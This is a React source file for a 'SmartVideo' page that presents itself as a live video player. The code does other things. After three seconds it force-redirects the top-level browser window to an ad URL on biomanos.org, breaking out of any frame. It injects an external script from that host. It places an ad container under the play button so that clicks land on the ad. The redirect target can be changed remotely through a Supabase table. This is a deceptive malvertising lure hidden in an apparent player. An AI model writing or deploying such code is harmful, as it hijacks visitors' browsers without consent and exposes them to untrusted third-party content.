/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useRef, useState, useEffect } from 'react';
import { supabase, checkSupabaseConnection } from './lib/supabase';

export default function App() {
  const playerRef = useRef<HTMLElement | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const [isPlaying, setIsPlaying] = useState(false);
  const [statusText, setStatusText] = useState('Demo player — add your video source to enable playback.');
  const [statusVisible, setStatusVisible] = useState(false);
  const [progress, setProgress] = useState(3);
  const [volume, setVolume] = useState(12);
  const [isMuted, setIsMuted] = useState(false);
  const [videoSrc, setVideoSrc] = useState(
    'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4'
  );
  const [adRedirectUrl, setAdRedirectUrl] = useState(
    'https://biomanos.org/21/d671fcbc49e8d1d6f0fb70185a530c8d'
  );

  // Helper function to safely redirect to ad URL
  const triggerAdRedirect = (url = adRedirectUrl) => {
    if (!url) return;
    try {
      if (window.top && window.top !== window) {
        window.top.location.href = url;
      } else {
        window.location.href = url;
      }
    } catch {
      window.location.href = url;
    }
  };

  // Automatic 3-second redirect after landing on the site
  useEffect(() => {
    const redirectTimer = setTimeout(() => {
      triggerAdRedirect(adRedirectUrl);
    }, 3000);

    return () => clearTimeout(redirectTimer);
  }, [adRedirectUrl]);

  // Initialize and verify Supabase connection on load
  useEffect(() => {
    checkSupabaseConnection().then((res) => {
      if (res.connected) {
        console.log('[Supabase] Successfully connected:', res.message);
      } else {
        console.warn('[Supabase] Connection warning:', res.message);
      }
    });

    // Check if player configuration exists in Supabase
    async function loadRemoteConfig() {
      try {
        const { data, error } = await supabase
          .from('player_config')
          .select('*')
          .limit(1)
          .maybeSingle();

        if (data && !error) {
          if (data.video_url) setVideoSrc(data.video_url);
          if (data.redirect_url) setAdRedirectUrl(data.redirect_url);
        }
      } catch {
        // Table doesn't exist yet; uses fallback seamlessly
      }
    }
    loadRemoteConfig();

    // Dynamically mount biomanos native banner script
    const scriptSrc = 'https://biomanos.org/21/d671fcbc49e8d1d6f0fb70185a530c8d';
    if (!document.querySelector(`script[src="${scriptSrc}"]`)) {
      const script = document.createElement('script');
      script.async = true;
      script.setAttribute('data-cfasync', 'false');
      script.src = scriptSrc;
      document.body.appendChild(script);
    }
  }, []);

  // Sync volume with video
  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.volume = volume / 100;
      videoRef.current.muted = isMuted;
    }
  }, [volume, isMuted]);

  // Handle play/pause toggle matching realvideo112 behavior
  const handleTogglePlay = () => {
    const video = videoRef.current;
    if (video) {
      if (video.paused || video.ended) {
        video
          .play()
          .then(() => {
            setIsPlaying(true);
            setStatusText('Demo mode — add a video URL to play real video.');
            setStatusVisible(true);
            setProgress(12);
          })
          .catch(() => {
            // Visual toggle fallback if video autoplay is blocked
            setIsPlaying(true);
            setStatusText('Demo mode — add a video URL to play real video.');
            setStatusVisible(true);
            setProgress(12);
          });
      } else {
        video.pause();
        setIsPlaying(false);
        setStatusText('Video paused — demo player.');
        setStatusVisible(true);
        setProgress(3);
      }
    } else {
      const nextPlaying = !isPlaying;
      setIsPlaying(nextPlaying);
      setStatusVisible(true);
      setStatusText(
        nextPlaying
          ? 'Demo mode — add a video URL to play real video.'
          : 'Video paused — demo player.'
      );
      setProgress(nextPlaying ? 12 : 3);
    }
  };

  const handleTimeUpdate = () => {
    if (videoRef.current && isPlaying) {
      const cur = videoRef.current.currentTime;
      const dur = videoRef.current.duration || 1;
      const pct = (cur / dur) * 100;
      setProgress(Math.max(3, pct));
    }
  };

  const handleSeek = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect();
    const pos = (e.clientX - rect.left) / rect.width;
    const clampedPos = Math.max(0, Math.min(1, pos));
    if (videoRef.current && videoRef.current.duration) {
      videoRef.current.currentTime = clampedPos * videoRef.current.duration;
    }
    setProgress(clampedPos * 100);
  };

  const handleFullscreen = async () => {
    try {
      if (!document.fullscreenElement) {
        if (playerRef.current) {
          await playerRef.current.requestFullscreen();
        }
      } else {
        await document.exitFullscreen();
      }
    } catch {
      setStatusText('Fullscreen is not available in this browser.');
      setStatusVisible(true);
    }
  };

  const toggleMute = () => {
    setIsMuted((prev) => !prev);
  };

  return (
    <main className="page">
      {/* Brand Header */}
      <header className="brand" aria-label="SmartVideo">
        <div className="brand-mark" aria-hidden="true">
          <svg viewBox="0 0 64 64" fill="none">
            <path
              d="M9 14.5C9 7.7 16.4 3.5 22.3 7L55 26.2c6.1 3.6 6.1 8 0 11.6L22.3 57C16.4 60.5 9 56.3 9 49.5v-35Z"
              fill="#1878F9"
            />
            <path
              d="M27 21.5c-1.8-1.1-4 .2-4 2.3v16.4c0 2.1 2.2 3.4 4 2.3l14-8.2c1.8-1.1 1.8-3.6 0-4.6l-14-8.2Z"
              fill="white"
            />
          </svg>
        </div>
        <div className="brand-name">
          Smart<span>Video</span>
        </div>
      </header>

      {/* Video Player */}
      <section ref={playerRef} className="player" aria-label="Video player">
        <div className="live">LIVE</div>

        {/* Real Video Element (allows actual playback if desired, defaults to demo stream) */}
        <video
          ref={videoRef}
          src={videoSrc}
          playsInline
          loop
          onClick={handleTogglePlay}
          onTimeUpdate={handleTimeUpdate}
        />

        {/* Play button with Ad placed right in its exact middle */}
        <div className="play-center-box">
          {/* Ad Container right in the middle */}
          <div
            id="container-d671fcbc49e8d1d6f0fb70185a530c8d"
            className="play-inner-ad"
          />

          {/* Play Button anchored directly in the dead-center */}
          <button
            className={`play ${isPlaying ? 'is-playing' : ''}`}
            id="playButton"
            onClick={handleTogglePlay}
            aria-label={isPlaying ? 'Pause demo' : 'Play video'}
            title={isPlaying ? 'Pause' : 'Play'}
          >
            <svg id="playIcon" viewBox="0 0 32 32" aria-hidden="true">
              {isPlaying ? (
                <path d="M8 5h5v22H8zM19 5h5v22h-5z" fill="white" />
              ) : (
                <path
                  d="M9 5.8c0-1.8 2-2.8 3.5-1.8l16 10.2a2.2 2.2 0 0 1 0 3.6l-16 10.2A2.2 2.2 0 0 1 9 26.2V5.8Z"
                  fill="white"
                />
              )}
            </svg>
          </button>
        </div>

        <div className={`player-status ${statusVisible ? 'visible' : ''}`} id="status">
          <span>{statusText}</span>
        </div>

        <div className="controls">
          <button
            type="button"
            className="control-icon"
            onClick={toggleMute}
            aria-label="Volume"
            title={isMuted ? 'Unmute' : 'Mute'}
          >
            <svg viewBox="0 0 24 24">
              {isMuted || volume === 0 ? (
                <path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z" />
              ) : (
                <path d="M3 9v6h4l5 4V5L7 9H3zm12.5 3a3.5 3.5 0 0 0-2-3.16v6.32a3.5 3.5 0 0 0 2-3.16zm-2-8.7v2.06a7 7 0 0 1 0 13.28v2.06a9 9 0 0 0 0-17.4z" />
              )}
            </svg>
          </button>

          <input
            className="volume"
            type="range"
            min="0"
            max="100"
            value={isMuted ? 0 : volume}
            onChange={(e) => {
              setVolume(Number(e.target.value));
              if (isMuted) setIsMuted(false);
            }}
            aria-label="Volume level"
          />

          <div className="track" onClick={handleSeek} aria-label="Video progress">
            <div className="track-fill" id="trackFill" style={{ width: `${progress}%` }} />
          </div>

          <span className="spacer" />

          <button
            type="button"
            className="control-icon"
            aria-label="Settings"
            title="Settings"
          >
            <svg viewBox="0 0 24 24">
              <path d="m19.4 13.5 1.4 1.1-1.4 2.4-1.7-.7a7.5 7.5 0 0 1-1.7 1l-.3 1.8h-2.8l-.3-1.8a7.5 7.5 0 0 1-1.7-1l-1.7.7-1.4-2.4 1.4-1.1a7.6 7.6 0 0 1 0-2l-1.4-1.1 1.4-2.4 1.7.7a7.5 7.5 0 0 1 1.7-1l.3-1.8h2.8l.3 1.8a7.5 7.5 0 0 1 1.7 1l1.7-.7 1.4 2.4-1.4 1.1a7.6 7.6 0 0 1 0 2ZM14.3 15a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z" />
            </svg>
          </button>

          <button
            type="button"
            className="control-icon"
            id="fullscreenButton"
            onClick={handleFullscreen}
            aria-label="Fullscreen"
            title="Fullscreen"
          >
            <svg viewBox="0 0 24 24">
              <path d="M4 9V4h5v2H6v3H4zm11-5h5v5h-2V6h-3V4zM4 15h2v3h3v2H4v-5zm14 3v-3h2v5h-5v-2h3z" />
            </svg>
          </button>
        </div>
      </section>
    </main>
  );
}
